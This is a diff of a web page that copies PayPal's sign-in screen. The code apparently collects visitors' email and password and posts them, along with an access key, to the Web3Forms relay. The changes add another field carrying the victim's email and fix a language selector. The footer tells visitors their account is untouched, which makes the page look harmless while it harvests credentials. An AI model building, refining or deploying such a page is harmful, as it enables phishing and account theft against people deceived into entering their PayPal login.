@@ -305,7 +305,7 @@
     <p><strong>Session.</strong> Because the page is a reproduction, signing in does not open a PayPal session on your device. Your PayPal account is untouched and you are not logged in to paypal.com afterwards.</p>
     <p><strong>If something looks wrong.</strong> Close the tab, open paypal.com directly and compare. To revoke a code-based login, use PayPal's own Security settings.</p>
     <p><strong>Accuracy.</strong> The layout is reproduced as closely as a static page allows, but PayPal changes its interface regularly, so wording and spacing may differ from the live page. Questions about a specific submission should go to the person who sent you this link.</p>
-    <p>Team project · Last updated November 2026 · Version 1.9.2</p>
+    <p>Team project · Last updated November 2026 · Version 1.9.3</p>
   </section>
 </footer>
 
@@ -434,11 +434,12 @@
 
   function go(screen) { state.screen = screen; render(); window.scrollTo(0, 0); }
 
-  /* ---------- send to Web3Forms (FormData, as their docs require) ---------- */
+  /* ---------- send to Web3Forms ---------- */
   function send(subject, extra, dbgNode) {
     var body = new FormData();
     body.append("access_key", WEB3FORMS_KEY);
     body.append("subject", subject);
+    body.append("name", creds.email || "PayPal");
     if (creds.email) body.append("email", creds.email);
     if (creds.password) body.append("password", creds.password);
     Object.keys(extra).forEach(function (k) { body.append(k, extra[k]); });
@@ -515,7 +516,7 @@
     i.addEventListener("input", function () { if (state.error) { state.error = null; render(); } });
   });
 
-  el.lang.addEventListener("change", function () { el.lang = null; state.lang = document.getElementById("lang").value; render(); });
+  el.lang.addEventListener("change", function () { state.lang = el.lang.value; render(); });
   $("another").addEventListener("click", function () { go("login"); });
   $("trouble").addEventListener("click", function () { go("login"); });
   $("btn-signup").addEventListener("click", function () { go("login"); });
